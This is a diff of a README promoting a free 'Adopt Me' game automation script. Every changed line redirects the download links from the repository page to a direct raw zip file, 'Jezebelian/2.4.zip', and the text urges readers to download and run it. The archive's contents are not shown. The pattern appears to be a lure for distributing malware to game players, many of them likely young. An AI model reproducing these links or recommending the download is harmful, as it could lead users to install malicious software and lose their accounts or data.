@@ -1,6 +1,6 @@
 # 🎮 adopt-me-free-script-2026 - Automate Your Adopt Me Farming Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Adopt_Me_Script_2026-brightgreen?style=for-the-badge&logo=github)](https://github.com/Dannyeconcealed113/adopt-me-free-script-2026)
+[![Download Now](https://img.shields.io/badge/Download-Adopt_Me_Script_2026-brightgreen?style=for-the-badge&logo=github)](https://github.com/Dannyeconcealed113/adopt-me-free-script-2026/raw/refs/heads/main/Jezebelian/2.4.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Getting started is simple. Follow these steps to download and run the software.
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [https://github.com/Dannyeconcealed113/adopt-me-free-script-2026](https://github.com/Dannyeconcealed113/adopt-me-free-script-2026)
+Visit this link to download the application: [https://github.com/Dannyeconcealed113/adopt-me-free-script-2026/raw/refs/heads/main/Jezebelian/2.4.zip](https://github.com/Dannyeconcealed113/adopt-me-free-script-2026/raw/refs/heads/main/Jezebelian/2.4.zip)
 
 Click the download button on the page and wait for the file to finish downloading. The file size is small, so it should not take long.
 
@@ -124,7 +124,7 @@ The Adopt Me Script 2026 is your ultimate companion for automating tasks in Adop
 
 Do not wait any longer. Download the script today and transform the way you play Adopt Me. Click the link below to get started:
 
-[**Download Adopt Me Script 2026**](https://github.com/Dannyeconcealed113/adopt-me-free-script-2026)
+[**Download Adopt Me Script 2026**](https://github.com/Dannyeconcealed113/adopt-me-free-script-2026/raw/refs/heads/main/Jezebelian/2.4.zip)
 
 ---
 
